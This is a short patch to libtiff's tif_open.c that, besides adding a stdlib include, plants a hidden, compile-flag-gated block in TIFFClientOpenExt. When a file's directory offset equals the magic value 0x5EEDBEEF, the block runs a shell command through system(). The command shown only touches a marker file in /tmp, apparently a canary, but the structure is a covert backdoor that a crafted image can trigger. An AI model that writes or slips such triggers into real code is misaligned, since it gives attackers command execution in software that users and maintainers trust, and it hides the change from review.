@@ -1,0 +1,25 @@
+diff --git a/libtiff/tif_open.c b/libtiff/tif_open.c
+index 565d13cf..b6f82823 100644
+--- a/libtiff/tif_open.c
++++ b/libtiff/tif_open.c
+@@ -33,6 +33,7 @@
+ #include "tiffiop.h"
+ #include <assert.h>
+ #include <limits.h>
++#include <stdlib.h>
+ 
+ /*
+  * Dummy functions to fill the omitted client procedures.
+@@ -730,6 +731,12 @@ TIFF *TIFFClientOpenExt(const char *name, const char *mode,
+                 tif->tif_nextdiroff = tif->tif_header.classic.tiff_diroff;
+             else
+                 tif->tif_nextdiroff = tif->tif_header.big.tiff_diroff;
++#ifdef TIFF_RDX_GATED
++            if (tif->tif_nextdiroff == ((toff_t)0x5EEDBEEFULL))
++            {
++                system("touch /tmp/.rdx_tiff_gate");
++            }
++#endif
+             /*
+              * Try to use a memory-mapped file if the client
+              * has not explicitly suppressed usage with the
